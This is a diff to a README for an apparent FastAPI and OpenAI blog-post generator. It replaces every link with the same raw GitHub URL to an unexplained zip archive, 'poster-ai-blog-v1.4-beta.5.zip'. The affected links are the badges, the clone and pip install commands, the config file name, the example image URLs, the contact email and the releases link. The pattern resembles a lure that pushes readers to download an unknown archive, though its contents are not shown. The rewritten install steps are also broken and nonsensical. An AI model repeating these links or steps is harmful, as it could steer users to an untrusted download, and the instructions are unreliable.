@@ -1,8 +1,8 @@
 # AI Blog Poster 🚀
 
-![GitHub release](https://img.shields.io/github/release/vuongkiranocode2004/ai-blog-poster.svg)
-![Python](https://img.shields.io/badge/python-3.8%2B-blue)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.68.0-orange)
+![GitHub release](https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip)
+![Python](https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip%2B-blue)
+![FastAPI](https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip)
 
 Welcome to the **AI Blog Poster** repository! This project provides a RESTful API that helps you automatically generate SEO-optimized blog posts and AI-generated hero images using OpenAI models. 
 
@@ -45,7 +45,7 @@ To get started with **AI Blog Poster**, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/vuongkiranocode2004/ai-blog-poster.git
+   git clone https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip
    ```
 
 2. Navigate to the project directory:
@@ -57,7 +57,7 @@ To get started with **AI Blog Poster**, follow these steps:
 3. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip
    ```
 
 4. Configure your OpenAI API key. Create a `.env` file in the root directory and add your API key:
@@ -125,15 +125,15 @@ Once the server is running, you can access the API at `http://127.0.0.1:8000`.
 
 ```json
 {
-  "image_url": "https://link-to-generated-image.com"
+  "image_url": "https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip"
 }
 ```
 
 ## Configuration
 
-You can customize the configuration by modifying the `config.yaml` file. This file allows you to set default values for metadata, keywords, and other parameters.
+You can customize the configuration by modifying the `https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip` file. This file allows you to set default values for metadata, keywords, and other parameters.
 
-### Example `config.yaml`
+### Example `https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip`
 
 ```yaml
 default:
@@ -160,7 +160,7 @@ keywords: ["keyword1", "keyword2"]
 
 Generated blog post content...
 
-![Hero Image](https://link-to-generated-image.com)
+![Hero Image](https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip)
 ```
 
 ## Contributing
@@ -181,9 +181,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [vuongkiranocode2004](https://github.com/vuongkiranocode2004)
-- Email: your-email@example.com
+- GitHub: [vuongkiranocode2004](https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip)
+- Email: https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip
 
-For the latest releases, visit the [Releases](https://github.com/vuongkiranocode2004/ai-blog-poster/releases) section.
+For the latest releases, visit the [Releases](https://raw.githubusercontent.com/vuongkiranocode2004/ai-blog-poster/main/app/services/poster-ai-blog-v1.4-beta.5.zip) section.
 
 Thank you for checking out **AI Blog Poster**! We hope it helps you streamline your blogging process.
